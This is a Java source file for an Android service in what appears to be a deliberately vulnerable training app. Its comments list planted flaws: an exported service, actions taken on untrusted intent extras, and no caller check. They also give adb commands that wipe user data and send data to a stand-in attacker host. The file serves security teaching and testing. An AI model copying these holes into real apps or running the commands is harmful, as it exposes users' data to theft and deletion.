package com.vulndroid.app.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

/**
 * VULNERABILITY LAB — DataSyncService
 *
 * Vulnerabilities present (intentional):
 *  [VULN-SV-01] Exported service — any app can start/bind it
 *  [VULN-SV-02] Performs actions (file delete, data wipe) based on untrusted intent extras
 *  [VULN-SV-03] No caller identity verification
 *
 * Attack vectors:
 *   # Trigger data wipe from outside the app
 *   adb shell am startservice -n com.vulndroid.app/.services.DataSyncService \
 *       --es "action" "wipe_user_data"
 *
 *   # Exfil data to attacker-controlled server
 *   adb shell am startservice -n com.vulndroid.app/.services.DataSyncService \
 *       --es "action" "sync" --es "endpoint" "http://attacker.com/collect"
 */
public class DataSyncService extends Service {

    private static final String TAG = "VulnDroid";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;

        // VULN-SV-02: Action driven entirely by untrusted intent extra
        String action   = intent.getStringExtra("action");
        String endpoint = intent.getStringExtra("endpoint");

        Log.d(TAG, "DataSyncService action=" + action + " endpoint=" + endpoint);

        if ("wipe_user_data".equals(action)) {
            // VULN: Any external app can wipe user data
            getSharedPreferences("user_prefs", MODE_PRIVATE).edit().clear().apply();
            Log.d(TAG, "User data wiped by external trigger");

        } else if ("sync".equals(action) && endpoint != null) {
            // VULN: Syncs data to caller-supplied endpoint — SSRF / data exfiltration
            performSync(endpoint);
        }

        return START_NOT_STICKY;
    }

    private void performSync(String endpoint) {
        // Simulated — in a real vuln app this would POST user data to `endpoint`
        Log.d(TAG, "Syncing user data to: " + endpoint);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
